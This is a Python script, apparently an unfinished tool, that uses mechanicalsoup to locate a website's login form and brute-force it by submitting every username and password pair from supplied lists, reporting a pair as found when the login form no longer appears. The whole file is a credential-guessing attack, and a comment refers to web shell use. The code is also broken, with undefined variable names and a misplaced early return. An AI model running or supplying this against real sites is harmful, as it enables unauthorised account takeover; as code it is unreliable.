import re, mechanicalsoup

def analysis(form):
   reTextControl = r"text\((.*)\)"
   rePasswdControl = r"password\((.*)\)"
   txtPasswdControl = re.findall(rePasswdControl, form)
      # Find password control. If has
      # 	1 password control -> login field
      # 	2 or more password control -> possibly register field
   if len(txtPasswdControl) == 1:
      txtTextControl = re.findall(reTextControl, form)
      # if len(txtTextControl) == 1:
            # Regular login field. > 1 can be register specific field (maybe captcha)
      return (txtTextControl[0], txtPasswdControl[0])
         # FOR WEB SHELL ONLY. REMOVE BUT CAN BE USED LATER IF NEEDED
         # elif len(txtTextControl) == 0:
         #    # Possibly password field login only
         #    return ([uint_formID, txtSubmitControl[0]], [txtPasswdControl[0]])
   return False

def getLoginForm(objBrowser):
   loginFields = False
   for fid, form in enumerate(objBrowser.forms()):
      try:
         loginFields = analysis(form)

         if loginFields:
            textField, passField = loginFields
            loginFields = (fid, textField, passField)
            return loginFields
      except Exception as error:
         if fid == 0:
            print("[x] Found no form")
         else:
            print("%s" %(error))
         break
      finally:
         return loginFields

def createBrowser():
   browser = mechanicalsoup.StatefulBrowser()
   # SETTINGS HERE
   return browser

def check(url):
   # Check if url has login form
   browser = createBrowser()
   try:
      browser.open(URL)
      # OPENING URL, DEBUG MSG HERE
      result = getLoginForm(browser)
   except Exception as error:
      # PRINT ERROR HERE
      result = False
   finally:
      browser.close()
      return result

def brute(url, userlist, passlist, threads = 16):
   check_result = check(url)
   if not check_result:
      print("[x] Get login form error")
   else:
      formID, formUser, formPass = check_result

   for username in usrlist:
      for password in passlist:
         # CREATE NEW BROWSER FOR EACH LOGIN. THIS IS A MUST DO
         try:
            browser = createBrowser()
            browser.open(URL)
            # FILL FORM WITH VALUES
            browser.select_form(nr = formID)
            browser[formUser] = username
            browser[formPass] = password
            # SUBMIT 
            browser.submit_selected()
            # check condition here
            # HAS FORM
            check_form = getLoginForm(browser)
            if not check_form:
               print("Found: [%s:%s]" %(username, password))
               break
         # except mechanicalsoup.utils.LinkNotFoundError:
         #    # HAS NO FORM
         #    # OLD CODE STRUCT, TEST MORE
         #    print("Found: [%s:%s]" %(username, password))
         #    break
         except Exception as error:
            # PRINT ERROR
            pass
         # ADD MORE CONDITION HERE
         finally:
            browser.close()
